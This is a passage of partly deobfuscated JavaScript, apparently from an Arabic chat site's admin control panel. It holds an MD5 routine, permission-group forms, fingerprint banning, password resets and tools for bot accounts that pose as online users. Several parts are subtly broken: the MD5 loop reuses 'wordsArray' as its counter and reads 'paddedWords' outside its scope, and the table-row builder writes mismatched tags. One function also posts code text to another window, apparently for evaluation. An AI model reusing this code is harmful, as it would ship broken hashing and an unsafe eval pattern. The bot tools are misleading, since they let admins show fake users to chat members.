            // دالة تحويل الأرقام الثنائية إلى نصوص بنظام ست عشري (Hex Converter)
            function wordToHex(word) {
                var hexString = '';
                var singleByte = '';
                var i;
                for (i = 0; 3 >= i; i++) {
                    singleByte = word >>> 0x8 * i & 0xff;
                    singleByte = '0' + singleByte.toString(0x10);
                    hexString += singleByte.substr(singleByte.length - 2, 2);
                }
                return hexString;
            }

            var wordsArray = [];
            var a;
            var b;
            var c;
            var d;
            var oldA;
            var oldB;
            var oldC;
            var oldD;

            // معالجة النصوص وترميزها لتتوافق مع نظام UTF-8 لعدم حدوث أخطاء مع الحروف العربية والرموز التعبيرية
            inputString = function (cleanText) {
                cleanText = cleanText.replace(/\r\n/g, "\n");
                var utf8Text = '';
                for (var i = 0; i < cleanText.length; i++) {
                    var charCode = cleanText.charCodeAt(i);
                    if (0x80 > charCode) {
                        utf8Text += String.fromCharCode(charCode);
                    } else {
                        if (0x7f < charCode && 0x800 > charCode) {
                            utf8Text += String.fromCharCode(charCode >> 6 | 0xc0);
                        } else {
                            utf8Text += String.fromCharCode(charCode >> 0xc | 0xe0);
                            utf8Text += String.fromCharCode(charCode >> 6 & 0x3f | 0x80);
                        }
                        utf8Text += String.fromCharCode(charCode & 0x3f | 0x80);
                    }
                }
                return utf8Text;
            }(inputString);

            // مرحلة تقسيم النص وتعبئته في مصفوفة كلمات 32-بت (Padding block) وتمديد الحجم إلى مضاعفات الـ 64 بايت
            wordsArray = function (utf8String) {
                var blockIndex;
                var stringLength = utf8String.length;
                blockIndex = stringLength + 0x8;
                var allocatedSize = 0x10 * ((blockIndex - blockIndex % 0x40) / 0x40 + 1);
                var paddedWords = Array(allocatedSize - 1);
                var bitShiftOffset = 0;
                for (var i = 0; i < stringLength;) {
                    blockIndex = (i - i % 4) / 4;
                    bitShiftOffset = i % 4 * 0x8;
                    paddedWords[blockIndex] |= utf8String.charCodeAt(i) << bitShiftOffset;
                    i++;
                }
                blockIndex = (i - i % 4) / 4;
                paddedWords[blockIndex] |= 0x80 << i % 4 * 0x8;
                paddedWords[allocatedSize - 2] = stringLength << 3;
                paddedWords[allocatedSize - 1] = stringLength >>> 0x1d;
                return paddedWords;
            }(inputString);
            // القيم الابتدائية الثابتة لمسجلات خوارزمية التشفير الأساسية (MD5 Buffers Initialization)
            state_A = 0x67452301;
            state_B = 0xefcdab89;
            state_C = 0x98badcfe;
            state_D = 0x10325476;

            // حلقة معالجة مصفوفة الكلمات وتقسيمها إلى كتل بحجم 16 كلمة (64 بايت للكتلة الواحدة)
            for (wordsArray = 0; wordsArray < paddedWords.length; wordsArray += 0x10) {
                oldA = state_A;
                oldB = state_B;
                oldC = state_C;
                oldD = state_D;

                // ==========================================
                // المرحلة الأولى: تنفيذ دالة المعالجة md5_F (Round 1)
                // ==========================================
                state_A = md5_F(state_A, state_B, state_C, state_D, paddedWords[wordsArray + 0], 0x7, 0xd76aa478);
                state_D = md5_F(state_D, state_A, state_B, state_C, paddedWords[wordsArray + 1], 0xc, 0xe8c7b756);
                state_C = md5_F(state_C, state_D, state_A, state_B, paddedWords[wordsArray + 2], 0x11, 0x242070db);
                state_B = md5_F(state_B, state_C, state_D, state_A, paddedWords[wordsArray + 3], 0x16, 0xc1bdceee);
                state_A = md5_F(state_A, state_B, state_C, state_D, paddedWords[wordsArray + 4], 0x7, 0xf57c0faf);
                state_D = md5_F(state_D, state_A, state_B, state_C, paddedWords[wordsArray + 5], 0xc, 0x4787c62a);
                state_C = md5_F(state_C, state_D, state_A, state_B, paddedWords[wordsArray + 6], 0x11, 0xa8304613);
                state_B = md5_F(state_B, state_C, state_D, state_A, paddedWords[wordsArray + 0x7], 0x16, 0xfd469501);
                state_A = md5_F(state_A, state_B, state_C, state_D, paddedWords[wordsArray + 0x8], 0x7, 0x698098d8);
                state_D = md5_F(state_D, state_A, state_B, state_C, paddedWords[wordsArray + 0x9], 0xc, 0x8b44f7af);
                state_C = md5_F(state_C, state_D, state_A, state_B, paddedWords[wordsArray + 10], 0x11, 0xffff5bb1);
                state_B = md5_F(state_B, state_C, state_D, state_A, paddedWords[wordsArray + 0xb], 0x16, 0x895cd7be);
                state_A = md5_F(state_A, state_B, state_C, state_D, paddedWords[wordsArray + 0xc], 0x7, 0x6b901122);
                state_D = md5_F(state_D, state_A, state_B, state_C, paddedWords[wordsArray + 0xd], 0xc, 0xfd987193);
                state_C = md5_F(state_C, state_D, state_A, state_B, paddedWords[wordsArray + 0xe], 0x11, 0xa679438e);
                state_B = md5_F(state_B, state_C, state_D, state_A, paddedWords[wordsArray + 15], 0x16, 0x49b40821);

                // ==========================================
                // المرحلة الثانية: تنفيذ دالة المعالجة md5_G (Round 2)
                // ==========================================
                state_A = md5_G(state_A, state_B, state_C, state_D, paddedWords[wordsArray + 1], 5, 0xf61e2562);
                state_D = md5_G(state_D, state_A, state_B, state_C, paddedWords[wordsArray + 6], 0x9, 0xc040b340);
                state_C = md5_G(state_C, state_D, state_A, state_B, paddedWords[wordsArray + 0xb], 0xe, 0x265e5a51);
                state_B = md5_G(state_B, state_C, state_D, state_A, paddedWords[wordsArray + 0], 0x14, 0xe9b6c7aa);
                state_A = md5_G(state_A, state_B, state_C, state_D, paddedWords[wordsArray + 5], 5, 0xd62f105d);
                state_D = md5_G(state_D, state_A, state_B, state_C, paddedWords[wordsArray + 10], 0x9, 0x2441453);
                state_C = md5_G(state_C, state_D, state_A, state_B, paddedWords[wordsArray + 15], 0xe, 0xd8a1e681);
                state_B = md5_G(state_B, state_C, state_D, state_A, paddedWords[wordsArray + 4], 0x14, 0xe7d3fbc8);
                state_A = md5_G(state_A, state_B, state_C, state_D, paddedWords[wordsArray + 0x9], 5, 0x21e1cde6);
                state_D = md5_G(state_D, state_A, state_B, state_C, paddedWords[wordsArray + 0xe], 0x9, 0xc33707d6);
                state_C = md5_G(state_C, state_D, state_A, state_B, paddedWords[wordsArray + 3], 0xe, 0xf4d50d87);
                state_B = md5_G(state_B, state_C, state_D, state_A, paddedWords[wordsArray + 0x8], 0x14, 0x455a14ed);
                state_A = md5_G(state_A, state_B, state_C, state_D, paddedWords[wordsArray + 0xd], 5, 0xa9e3e905);
                state_D = md5_G(state_D, state_A, state_B, state_C, paddedWords[wordsArray + 2], 0x9, 0xfcefa3f8);
                state_C = md5_G(state_C, state_D, state_A, state_B, paddedWords[wordsArray + 0x7], 0xe, 0x676f02d9);
                state_B = md5_G(state_B, state_C, state_D, state_A, paddedWords[wordsArray + 0xc], 0x14, 0x8d2a4c8a);

                // ==========================================
                // المرحلة الثالثة: بدء تنفيذ دالة المعالجة md5_H (Round 3)
                // ==========================================
                state_A = md5_H(state_A, state_B, state_C, state_D, paddedWords[wordsArray + 5], 4, 0xfffa3942);
                state_D = md5_H(state_D, state_A, state_B, state_C, paddedWords[wordsArray + 0x8], 0xb, 0x8771f681);
                state_C = md5_H(state_C, state_D, state_A, state_B, paddedWords[wordsArray + 0xb], 0x10, 0x6d9d6122);
                state_B = md5_H(state_B, state_C, state_D, state_A, paddedWords[wordsArray + 0xe], 0x17, 0xfde5380c);
                // ==========================================
                // تابع المرحلة الثالثة: استكمال دالة المعالجة md5_H (Round 3)
                // ==========================================
                state_A = md5_H(state_A, state_B, state_C, state_D, paddedWords[wordsArray + 1], 4, 0xa4beea44);
                state_D = md5_H(state_D, state_A, state_B, state_C, paddedWords[wordsArray + 4], 0xb, 0x4bdecfa9);
                state_C = md5_H(state_C, state_D, state_A, state_B, paddedWords[wordsArray + 0x7], 0x10, 0xf6bb4b60);
                state_B = md5_H(state_B, state_C, state_D, state_A, paddedWords[wordsArray + 10], 0x17, 0xbebfbc70);
                state_A = md5_H(state_A, state_B, state_C, state_D, paddedWords[wordsArray + 0xd], 4, 0x289b7ec6);
                state_D = md5_H(state_D, state_A, state_B, state_C, paddedWords[wordsArray + 0], 0xb, 0xeaa127fa);
                state_C = md5_H(state_C, state_D, state_A, state_B, paddedWords[wordsArray + 3], 0x10, 0xd4ef3085);
                state_B = md5_H(state_B, state_C, state_D, state_A, paddedWords[wordsArray + 6], 0x17, 0x4881d05);
                state_A = md5_H(state_A, state_B, state_C, state_D, paddedWords[wordsArray + 0x9], 4, 0xd9d4d039);
                state_D = md5_H(state_D, state_A, state_B, state_C, paddedWords[wordsArray + 0xc], 0xb, 0xe6db99e5);
                state_C = md5_H(state_C, state_D, state_A, state_B, paddedWords[wordsArray + 15], 0x10, 0x1fa27cf8);
                state_B = md5_H(state_B, state_C, state_D, state_A, paddedWords[wordsArray + 2], 0x17, 0xc4ac5665);

                // ==========================================
                // المرحلة الرابعة: تنفيذ دالة المعالجة md5_I (Round 4)
                // ==========================================
                state_A = md5_I(state_A, state_B, state_C, state_D, paddedWords[wordsArray + 0], 6, 0xf4292244);
                state_D = md5_I(state_D, state_A, state_B, state_C, paddedWords[wordsArray + 0x7], 10, 0x432aff97);
                state_C = md5_I(state_C, state_D, state_A, state_B, paddedWords[wordsArray + 0xe], 15, 0xab9423a7);
                state_B = md5_I(state_B, state_C, state_D, state_A, paddedWords[wordsArray + 5], 0x15, 0xfc93a039);
                state_A = md5_I(state_A, state_B, state_C, state_D, paddedWords[wordsArray + 0xc], 6, 0x655b59c3);
                state_D = md5_I(state_D, state_A, state_B, state_C, paddedWords[wordsArray + 3], 10, 0x8f0ccc92);
                state_C = md5_I(state_C, state_D, state_A, state_B, paddedWords[wordsArray + 10], 15, 0xffeff47d);
                state_B = md5_I(state_B, state_C, state_D, state_A, paddedWords[wordsArray + 1], 0x15, 0x85845dd1);
                state_A = md5_I(state_A, state_B, state_C, state_D, paddedWords[wordsArray + 0x8], 6, 0x6fa87e4f);
                state_D = md5_I(state_D, state_A, state_B, state_C, paddedWords[wordsArray + 15], 10, 0xfe2ce6e0);
                state_C = md5_I(state_C, state_D, state_A, state_B, paddedWords[wordsArray + 6], 15, 0xa3014314);
                state_B = md5_I(state_B, state_C, state_D, state_A, paddedWords[wordsArray + 0xd], 0x15, 0x4e0811a1);
                state_A = md5_I(state_A, state_B, state_C, state_D, paddedWords[wordsArray + 4], 6, 0xf7537e82);
                state_D = md5_I(state_D, state_A, state_B, state_C, paddedWords[wordsArray + 0xb], 10, 0xbd3af235);
                state_C = md5_I(state_C, state_D, state_A, state_B, paddedWords[wordsArray + 2], 15, 0x2ad7d2bb);
                state_B = md5_I(state_B, state_C, state_D, state_A, paddedWords[wordsArray + 0x9], 0x15, 0xeb86d391);

                // دمج نتائج معالجة الكتلة الحالية مع قيم المسجلات التراكمية السابقة بواسطة الجمع الآمن
                state_A = safeAdd(state_A, oldA);
                state_B = safeAdd(state_B, oldB);
                state_C = safeAdd(state_C, oldC);
                state_D = safeAdd(state_D, oldD);
            }

            // تحويل المسجلات الأربعة النهائية (A, B, C, D) إلى نصوص ست عشرية ودمجها لاستخراج كود الهاش النهائي الصغير
            return (wordToHex(state_A) + wordToHex(state_B) + wordToHex(state_C) + wordToHex(state_D)).toLowerCase();
        }

        function buildTableHtmlElement(_0x3f451b) {
            var _0x1013e1 = $("<table class=\"tablesorter\"><tr>");
            _0x1013e1.append("<thead><tr></thead>");
            _0x1013e1.append("<tbody style=\"vertical-align: top;\"></tbody>");
            $.each(_0x3f451b, function (_0x30f329, _0x7d390e) {
                _0x1013e1.find("thead").find('tr').append("<th class='border'>" + _0x7d390e + "</th>");
            });
            _0x1013e1.tablesorter();
            return _0x1013e1;
        }

        function buildTableRowHtml(_0x21629a, _0x5c0fcc) {
            var _0x1ce74d = '';
            $.each(_0x21629a, function (_0x44000f, _0x142c25) {
                if (_0x44000f == _0x21629a.length - 1) {
                    _0x1ce74d += '<td>' + (_0x142c25 + '') + "</td>";
                } else {
                    _0x1ce74d += "<td  style=\"max-width:" + _0x5c0fcc[_0x44000f] + "px;\">" + (_0x142c25 + '').replace(/\</g, "&#x3C;") + "</tr>";
                }
            });
            return "<tr>" + _0x1ce74d + "<tr>";
        }

        function appendTableRow(_0x150799, _0x2a52bf, _0x5023dc) {
            var _0x57b6b9 = $(_0x150799);
            var _0x1b5d6d = $("<tr></tr>");
            $.each(_0x2a52bf, function (_0x3d9ed1, _0xee838c) {
                if (_0x3d9ed1 == _0x2a52bf.length - 1) {
                    _0x1b5d6d.append("<td>" + (_0xee838c + '') + "</td>");
                } else {
                    _0x1b5d6d.append("<td style=\"max-width:" + _0x5023dc[_0x3d9ed1] + "px;\">" + (_0xee838c + '').replace(/\</g, "&#x3C;") + "</td>");
                }
            });
            _0x57b6b9.find("tbody").append(_0x1b5d6d);
            return _0x1b5d6d;
        }
        Number.prototype.time = function () {
            var _0x3ae243 = this;
            var days = 0;
            var hours = 0;
            var minutes = 0;
            var seconds = 0;
            var result = '';
            days = parseInt(_0x3ae243 / 86400000);
            _0x3ae243 = _0x3ae243 - parseInt(86400000 * days);
            hours = parseInt(_0x3ae243 / 3600000);
            _0x3ae243 = _0x3ae243 - parseInt(3600000 * hours);
            minutes = parseInt(_0x3ae243 / 60000);
            _0x3ae243 = _0x3ae243 - parseInt(60000 * minutes);
            seconds = parseInt(_0x3ae243 / 0x3e8);
            if (hours > 0x9) {
                result += hours + ':';
            } else {
                result += '0' + hours + ':';
            }
            if (minutes > 0x9) {
                result += minutes + ':';
            } else {
                result += '0' + minutes + ':';
            }
            if (seconds > 0x9) {
                result += seconds;
            } else {
                result += '0' + seconds;
            }
            return (days ? (days > 0x9 ? days : '0' + days) + ':' : '') + result;
        };

        function cp_powers() {
            var searchValue = $("#psearch").val();
            var filteredPowers = searchValue == '' ? activeAlerts : activeAlerts.filter(function (powerItem) {
                return powerItem.rank == searchValue || powerItem.name.indexOf(searchValue) != -1;
            });
            $("#cp .powerbox").children().remove();
            filteredPowers.sort(function (a, b) {
                return (b.rank || 0) - (a.rank || 0);
            });
            for (var i = 0; i < filteredPowers.length; i++) {
                $("#cp .powerbox").each(function (_0x228dfb, _0x42eb25) {
                    var option = $("<option></option>");
                    option.attr("value", filteredPowers[i].name);
                    option.text('[' + (filteredPowers[i].rank || 0) + "] " + filteredPowers[i].name);
                    $(_0x42eb25).append(option);
                });
                if (i == filteredPowers.length - 1) {
                    var emptyOption = $("<option></option>");
                    emptyOption.attr("value", '');
                    emptyOption.text('');
                    $("#cp #tuser .powerbox").prepend(emptyOption);
                }
            }
            renderSelectedPowerDetails();
        }

        function renderSelectedPowerDetails() {
            var powersArray = activeAlerts;
            var selectedName = $("#cp .selbox").val();
            var selectedPower = null;
            for (var i = 0; i < powersArray.length; i++) {
                if (powersArray[i].name == selectedName) {
                    selectedPower = powersArray[i];
                    break;
                }
            }
            if (selectedPower != null) {
                var fieldsLabels = [
                    ['rank', "الترتيب"],
                    ["name", "إسم المجموعه"],
                    ["ico", "الإيقونه"],
                    ['kick', "الطرد"],
                    ["delbc", "حذف الحائط"],
                    ["alert", "التنبيهات"],
                    ["mynick", "تغير النك"],
                    ["unick", "تغير النكات"],
                    ["ban", "الباند"],
                    ["publicmsg", "الإعلانات"],
                    ["ppmsg", "اعلانات السوابر"],
                    ["forcepm", "فتح الخاص"],
                    ["roomowner", "إداره الغرف"],
                    ["createroom", "انشاء الغرف"],
                    ["rooms", "اقصى حد للغرف الثابته"],
                    ["edituser", "إداره العضويات"],
                    ["setpower", "تعديل الصلاحيات"],
                    ["upgrades", "الهدايا"],
                    ["history", "كشف النكات"],
                    ['cp', "لوحه التحكم"],
                    ["rjoin", "دخول الغرف المغلقه"],
                    ["stealth", "مخفي"],
                    ["setLikes", "لايكات"],
                    ['dmsg', "مسح الرسائل"],
                    ["rinvite", "نقل الزوار"],
                    ['mic', "سحب المايك"],
                    ["cmic", "تفعيل المايك"],
                    ["owner", "إداره الموقع"]
                ];
                var formContainer = $("<div class='json' style='width:260px;'></div>");
                formContainer.append(buildJsonEditForm(selectedPower, fieldsLabels, function (updatedPower) {
                    send('cp', {
                        'cmd': "powers_save",
                        'power': updatedPower
                    });
                }));
                $("#cp #powers .json").remove();
                $("#cp #powers").append(formContainer);
                $("#cp #powers .delp").off().click(function () {
                    if (confirm("تأكيد حذف المجموعه؟ " + selectedPower.name)) {
                        send('cp', {
                            'cmd': "powers_del",
                            'name': selectedPower.name
                        });
                    }
                });
                $("#cp .sico img").removeClass("unread border");
                $("#cp .sico img[src='sico/" + selectedPower.ico + "']").addClass("unread border");
            }
        }

        function buildJsonEditForm(_0x429b2a, _0x83d4e6, _0x5bd102) {
            var formContainer = $("<div style=\"width:100%;height:100%;padding:5px;\" class=\"break\"></div>");
            var keysArray = Object.keys(_0x429b2a);
            $.each(keysArray, function (_0x2726db, keyName) {
                var labelText = null;
                if (_0x83d4e6 != null) {
                    $.each(_0x83d4e6, function (_0x52b49f, labelPair) {
                        if (labelPair[0] == keyName) {
                            labelText = labelPair[1];
                        }
                        keysArray.splice(keysArray.indexOf(labelPair[0]), 1);
                        keysArray.splice(_0x52b49f, 0, labelPair[0]);
                    });
                }
                if (labelText == null) {
                    return;
                }
                switch (typeof _0x429b2a[keyName]) {
                    case "string":
                        formContainer.append("<label class=\"label label-primary\">" + labelText + "</label>");
                        formContainer.append("<input type=\"text\" name=\"" + keyName.replace(/\"/g, '') + "\" class=\"\" value=\"" + _0x429b2a[keyName].replace(/\"/g, '') + "\"></br>");
                        break;
                    case "boolean":
                        formContainer.append("<label class=\"label label-primary\">" + labelText + "</label>");
                        var checkedAttr = '';
                        if (_0x429b2a[keyName]) {
                            checkedAttr = "checked";
                        }
                        formContainer.append("<label>تفعيل<input name=\"" + keyName.replace(/\"/g, '') + "\" type=\"checkbox\" class=\"\" " + checkedAttr + "></label></br>");
                        break;
                    case "number":
                        formContainer.append("<label class=\"label label-primary\">" + labelText + "</label>");
                        formContainer.append("<input name=\"" + keyName.replace(/\"/g, '') + "\" type=\"number\" style=\"width:60px;\" class=\"\" value=\"" + _0x429b2a[keyName] + "\"></br>");
                        break;
                }
            });
            formContainer.append("<button class=\"btn btn-primary fr fa fa-edit\">حفظ</button>");
            formContainer.find("button").click(function () {
                _0x5bd102(serializeFormInputsData(formContainer));
            });
            return formContainer;
        }

        function fltrit(path, value) {
            send('cp', {
                'cmd': "fltrit",
                'path': path,
                'v': value
            });
            $(".fltrit").val('');
        }

        function uploadImageWithProgress(_0x53ef96, _0x2eebd1) {
            var uploadRequest;
            openFileInputSelector("image/*", function (selectedFile) {
                var progressBox = $("<div class='mm msg ' style='width:200px;'><a class='fn '></a><button style='color:red;border:1px solid red;min-width:40px;' class=' cancl'>X</button></div>");
                progressBox.insertAfter($(_0x53ef96));
                $(progressBox).find(".cancl").click(function () {
                    $(progressBox).remove();
                    uploadRequest.abort();
                });
                uploadRequest = executeAjaxUpload("pic?secid=u&fn=" + selectedFile.name.split('.').pop(), selectedFile, function (responseUrl) {
                    _0x2eebd1(responseUrl);
                    $(progressBox).remove();
                }, function () {
                    $(progressBox).remove();
                }, function (progress) {
                    $(progressBox.find(".fn")).text('%' + parseInt(progress * 100) + " | " + selectedFile.name.split("\\").pop());
                });
            });
        }

        function roomspic(_0x54f49b) {
            uploadImageWithProgress(_0x54f49b, function (responseUrl) {
                $(_0x54f49b).attr("src", responseUrl);
            });
        }

        function domains_save() {
            var domainData = {
                'domain': $("#domain").val(),
                'name': $("#domain_name").val(),
                'title': $("#domain_title").val(),
                'bg': ('#' + ($("#cp .domain_sbg").val() || "272727")).replace('##', '#'),
                'buttons': ('#' + ($(".domain_sbuttons").val() || "303030")).replace('##', '#'),
                'background': ('#' + ($(".domain_sbackground").val() || "fafafa")).replace('##', '#'),
                'script': $("#domain_scr").val(),
                'keywords': $("#domain_keywords").val(),
                'description': $("#domain_description").val()
            };
            send('cp', {
                'cmd': "domainsave",
                'data': domainData
            });
        }

        function extractRootDomain(_0x310847) {
            if ((_0x310847 || '') == '') {
                return _0x310847;
            }
            var domainParts = _0x310847.indexOf('://') != -1 ? _0x310847.split("://")[1] : _0x310847;
            domainParts = domainParts.split('/')[0].split('.');
            return domainParts.length < 2 || domainParts[domainParts.length - 1] == '' ? '' : domainParts[domainParts.length - 2] + '.' + domainParts[domainParts.length - 1];
        }

        function sett_save() {
            var siteData = {
                'name': $("#sett_name").val(),
                'title': $("#sett_title").val(),
                'bg': $("#cp .sbg").val(),
                'buttons': $(".sbuttons").val(),
                'background': $(".sbackground").val(),
                'wall_likes': parseInt($(".wall_likes").val()),
                'wall_minutes': parseInt($(".wall_minutes").val()),
                'msgst': parseInt($(".msgstt").val()),
                'pmlikes': parseInt($(".pmlikes").val()),
                'notlikes': parseInt($(".notlikes").val()),
                'fileslikes': parseInt($(".fileslikes").val()),
                'allowg': $(".allowg").is(":checked"),
                'allowreg': $(".allowreg").is(":checked"),
                'rc': $(".rc").is(":checked"),
                'bclikes': $("#bclikes").is(":checked"),
                'mlikes': $("#mlikes").is(":checked"),
                'bcreply': $("#bcreply").is(":checked"),
                'mreply': $("#mreply").is(":checked"),
                'script': $("#sett_scr").val(),
                'keywords': $("#sett_keywords").val(),
                'description': $("#sett_description").val(),
                'proflikes': parseInt($("#sett .proflikes").val()),
                'piclikes': parseInt($("#sett .piclikes").val()),
                'maxIP': $(".maxIP").val() || 2,
                'maxshrt': $(".maxshrt").val() || 1,
                'stay': Math.max(1, Math.min(0x258, $(".stay").val() || 1)),
                'callsLike': $(".callsLike").val() || 0,
                'calls': $("#calls").is(":checked")
            };
            send('cp', {
                'cmd': "sitesave",
                'data': siteData
            });
        }

        function uploadAdminImage(_0x114919, _0x1057cd) {
            var uploadRequest;
            openFileInputSelector("image/*", function (selectedFile) {
                var progressBox = $("<div class='mm msg ' style='width:200px;'><a class='fn '></a><button style='color:red;border:1px solid red;min-width:40px;' class=' cancl'>X</button></div>");
                progressBox.insertAfter($(_0x114919));
                $(progressBox).find(".cancl").click(function () {
                    $(progressBox).remove();
                    uploadRequest.abort();
                });
                uploadRequest = executeAjaxUpload("upload?secid=u&a=x&fn=" + selectedFile.name.split('.').pop(), selectedFile, function (responseUrl) {
                    _0x1057cd(responseUrl);
                    $(progressBox).remove();
                }, function () {
                    $(progressBox).remove();
                }, function (progress) {
                    $(progressBox.find(".fn")).text('%' + parseInt(progress * 100) + " | " + selectedFile.name.split("\\").pop());
                });
            });
        }

        function s_sico(pid) {
            send('cp', {
                'cmd': "addico",
                'pid': pid,
                'tar': 'sico'
            });
        }

        function del_ico(element) {
            send('cp', {
                'cmd': "delico",
                'pid': $(element).attr("pid")
            });
        }

        function emo_order() {
            $(".p-emo").append($(".p-emo div").remove().sort(function (a, b) {
                return parseInt($(a).find("input").val()) > parseInt($(b).find("input").val()) ? 1 : -1;
            }).each(function (index, emoElement) {
                emoElement = $(emoElement).find("input");
                emoElement.attr("onchange", '');
                emoElement.val(index + 1);
                emoElement.attr("onchange", "emo_order();");
            }));
        }

        function formatLargeNumber(_0x4bf537) {
            var parts = _0x4bf537.toLocaleString("en-us").split(',');
            switch (parts.length) {
                case 1:
                case 2:
                    return _0x4bf537.toLocaleString();
                case 3:
                    return parts[0] + '.' + parts[1][0] + 'M';
                case 4:
                    return parts[0] + '.' + parts[1][0] + 'B';
            }
            return "999.9B";
        }

        function cp_fps(fingerprint) {
            if (window.cpWindow == null) {
                var newWindow = window.open("cp?cp=" + myid);
                setTimeout(function () {
                    newWindow.postMessage(['ev', {
                        'data': " $(\"a[href='#fps']\").click();\n            $('#fps input').val('" + fingerprint + "').trigger('change');"
                    }]);
                }, 100);
                return;
            }
            showcp();
            $("a[href='#fps']").click();
            $("#fps input").val(fingerprint).trigger("change");
        }

        function cp_bots(_0x2179bf, _0x2a7140) {
            openContextMenu(_0x2179bf, "الزخرفه,الوصف,الدوله,اللون,لون الخلفيه,تسجيل دخول,تسجيل خروج,الصوره,حذف الصوره,الغرفه,----,حذف".split(','), function (selectedOption) {
                switch (selectedOption) {
                    case "الغرفه":
                        openContextMenu(_0x2179bf, chatRoomsArray.filter(function (room) {
                            return room["delete"] != true && room.needpass == false;
                        }).map(function (room) {
                            return room.topic;
                        }), function (selectedRoom) {
                            var matchedRoom = chatRoomsArray.filter(function (room) {
                                return room.topic == selectedRoom;
                            });
                            if (matchedRoom.length) {
                                $(_0x2179bf).parent().parent().find("td:eq(5)").text(matchedRoom[0].topic);
                                send('cp', {
                                    'cmd': "bot",
                                    'id': _0x2a7140,
                                    'or': matchedRoom[0].id
                                });
                            }
                        });
                        break;
                    case "اللون":
                        var colorPicker = $(cldiv);
                        var triggerEl = _0x2179bf;
                        colorPicker.find('div').off().click(function () {
                            var targetCell = $(_0x2179bf).parent().parent().find("td:eq(2)")[0];
                            $(targetCell).css("color", this.style.color || '');
                            $(targetCell).css("color", $(this).attr('v')).attr('v', $(this).attr('v'));
                            send('cp', {
                                'cmd': "bot",
                                'id': _0x2a7140,
                                'ucol': $(this).attr('v')
                            });
                        });
                        openPopupDialog(triggerEl, colorPicker);
                        break;
                    case "لون الخلفيه":
                        var colorPicker = $(cldiv);
                        var triggerEl = _0x2179bf;
                        colorPicker.find('div').off().click(function () {
                            var targetCell = $(_0x2179bf).parent().parent().find("td:eq(2)")[0];
                            $(targetCell).css("background-color", this.style["background-color"] || '');
                            $(targetCell).css("background-color", $(this).attr('v')).attr('v', $(this).attr('v'));
                            send('cp', {
                                'cmd': "bot",
                                'id': _0x2a7140,
                                'bg': $(this).attr('v')
                            });
                        });
                        openPopupDialog(triggerEl, colorPicker);
                        break;
                    case "الزخرفه":
                        var newTopic = prompt("الزخرفه الجديده");
                        if (typeof newTopic == "string" && newTopic.length > 1) {
                            send('cp', {
                                'cmd': 'bot',
                                'id': _0x2a7140,
                                'topic': newTopic
                            });
                            $(_0x2179bf).parent().parent().find("td:eq(2)").text(newTopic);
                        }
                        break;
                    case "الوصف":
                        var newDesc = prompt("الوصف");
                        if (typeof newDesc == "string" && newDesc.length > 1) {
                            send('cp', {
                                'cmd': 'bot',
                                'id': _0x2a7140,
                                'msg': newDesc
                            });
                            $(_0x2179bf).parent().parent().find("td:eq(3)").text(newDesc);
                        }
                        break;
                    case "تسجيل دخول":
                        send('cp', {
                            'cmd': 'bot',
                            'id': _0x2a7140,
                            'online': true
                        });
                        $(_0x2179bf).parent().parent().find("td:eq(0)").text("متصل");
                        break;
                    case "تسجيل خروج":
                        send('cp', {
                            'cmd': "bot",
                            'id': _0x2a7140,
                            'online': false
                        });
                        $(_0x2179bf).parent().parent().find("td:eq(0)").text('');
                        break;
                    case "الدوله":
                        var countryCode = prompt("اكتب اسم الدوله من حرفين SA US IQ KW");
                        if (typeof countryCode == "string" && countryCode.length == 2 && uf[countryCode.toLowerCase()] != null) {
                            send('cp', {
                                'cmd': "bot",
                                'id': _0x2a7140,
                                'co': countryCode.toUpperCase()
                            });
                            $(_0x2179bf).parent().parent().find("td:eq(1)").text(countryCode.toUpperCase());
                        }
                        break;
                    case "حذف الصوره":
                        send('cp', {
                            'cmd': "bot",
                            'id': _0x2a7140,
                            'pic': "pic.png"
                        });
                        $(_0x2179bf).parent().find('img').attr("src", "pic.png");
                        break;
                    case "الصوره":
                        uploadImageWithProgress(null, function (responseUrl) {
                            send('cp', {
                                'cmd': "bot",
                                'id': _0x2a7140,
                                'pic': responseUrl
                            });
                            $(_0x2179bf).parent().find('img').attr("src", responseUrl);
                        });
                        break;
                    case "حذف":
                        send('cp', {
                            'cmd': 'bot',
                            'id': _0x2a7140,
                            'del': true
                        });
                        $(_0x2179bf).remove();
                        break;
                }
            });
        }

        function cp_fps_do(_0x2b5898, value, isLoginSearch) {
            openContextMenu(_0x2b5898, "بحث,بحث عميق 1,بحث عميق 2,بحث عميق 3,بحث عميق 4,حظر,حظر عميق 1,حظر عميق 2,حظر عميق 3,حظر عميق 4,سماح".split(','), function (selectedOption) {
                switch (selectedOption) {
                    case "بحث":
                        $((isLoginSearch == true ? "#logins" : "#fps") + " input").val(value).trigger("change");
                        break;
                    case "بحث عميق 1":
                        $((isLoginSearch == true ? "#logins" : "#fps") + " input").val('*=' + value).trigger("change");
                        break;
                    case "بحث عميق 2":
                        $((isLoginSearch == true ? "#logins" : "#fps") + " input").val("**=" + value).trigger("change");
                        break;
                    case "بحث عميق 3":
                        $((isLoginSearch == true ? "#logins" : "#fps") + " input").val("***=" + value).trigger("change");
                        break;
                    case "بحث عميق 4":
                        $((isLoginSearch == true ? "#logins" : "#fps") + " input").val("****=" + value).trigger("change");
                        break;
                    case "حظر":
                        send('cp', {
                            'cmd': 'ban',
                            'type': value
                        });
                        break;
                    case "حظر عميق 1":
                        send('cp', {
                            'cmd': 'ban',
                            'type': '*=' + value
                        });
                        break;
                    case "حظر عميق 2":
                        send('cp', {
                            'cmd': "ban",
                            'type': "**=" + value
                        });
                        break;
                    case "حظر عميق 3":
                        send('cp', {
                            'cmd': "ban",
                            'type': '***=' + value
                        });
                        break;
                    case "حظر عميق 4":
                        send('cp', {
                            'cmd': "ban",
                            'type': "****=" + value
                        });
                        break;
                    case "سماح":
                        send('cp', {
                            'cmd': "aban",
                            'type': value
                        });
                        break;
                }
            });
        }

        function cp_ledit(_0x100283, userId) {
            openContextMenu(_0x100283, "الايكات,كلمه المرور,الصلاحيه,-----,حذف العضويه".split(','), function (selectedOption) {
                switch (selectedOption) {
                    case "الايكات":
                        var newLikes = parseInt(prompt("اكتب الايكات الجديدة"));
                        if (newLikes != null && !isNaN(newLikes)) {
                            send('cp', {
                                'cmd': "likes",
                                'id': userId,
                                'likes': newLikes
                            });
                        }
                        break;
                    case "كلمه المرور":
                        var newPassword = prompt("كلمه المرور الجديدة");
                        if (newPassword != null && newPassword != '') {
                            send('cp', {
                                'cmd': "pwd",
                                'id': userId,
                                'pwd': newPassword
                            });
                        }
                        break;
                    case "الصلاحيه":
                        var optionsList = [];
                        optionsList.push("البحث");
                        optionsList.push("سحب الصلاحيه");
                        var optionsMap = {};
